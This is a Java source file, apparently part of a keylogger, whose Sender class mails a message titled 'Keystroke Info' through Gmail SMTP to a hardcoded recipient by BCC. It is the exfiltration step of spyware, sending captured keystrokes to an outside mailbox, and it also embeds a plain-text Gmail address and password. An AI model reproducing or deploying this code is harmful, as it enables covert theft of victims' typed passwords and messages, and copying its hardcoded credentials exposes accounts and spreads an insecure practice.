/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package handlers;

import java.util.Properties;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

/**
 *
 * @author RITIK
 */
public class Sender {
     private Sender(){}
     
     private static final String SENDERS_GMAIL = "preetimakrani123@gmail.com";
     private static final String SENDERS_PASSWORD = "Gourav@123";
     private static final String RECIEVERS_EMAIL = "venkateshswamy12345@gmail.com";
     
     private static Properties mailServerProperties;
    private static Session mailSession;
    private static MimeMessage mailMessage;
    
    public static void sendMail(String emailBody) throws Throwable
    { mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port","587");
        mailServerProperties.put("mail.smtp.auth", "true");
        mailServerProperties.put("mail.smtp.starttls.enable", "true");
        mailServerProperties.put("mail.smtp.ssl.trust", "smtp.gmail.com");
    
         mailSession = Session.getDefaultInstance(mailServerProperties);
         mailMessage = new MimeMessage(mailSession);
         mailMessage.addRecipient(Message.RecipientType.BCC, new InternetAddress(RECIEVERS_EMAIL));
         mailMessage.setSubject("Keystroke Info");
         mailMessage.setContent(emailBody,"text/html");
         
         Transport transport = mailSession.getTransport("smtp");
         transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWORD);
         transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
         transport.close();
         
    }
}
